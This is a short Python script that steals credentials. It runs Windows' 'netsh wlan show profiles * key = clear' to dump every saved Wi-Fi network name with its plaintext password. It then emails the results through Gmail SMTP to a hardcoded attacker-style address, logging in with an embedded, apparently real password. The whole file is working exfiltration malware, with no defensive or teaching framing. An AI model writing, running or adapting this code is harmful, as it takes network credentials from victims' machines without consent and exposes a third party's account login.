import subprocess as s
import smtplib
def nitish_email(email,password,message):
      srv = smtplib.SMTP('smtp.gmail.com', 587)
      srv.starttls()
      srv.login(email,password)
      srv.sendmail(email,email,message)
      srv.quit()
      
cmd = ("netsh wlan show profiles * key = clear")
out = s.check_output(cmd, shell = True)
nitish_email("hacktheworld378@gmail.com","7004969879nitish",out)

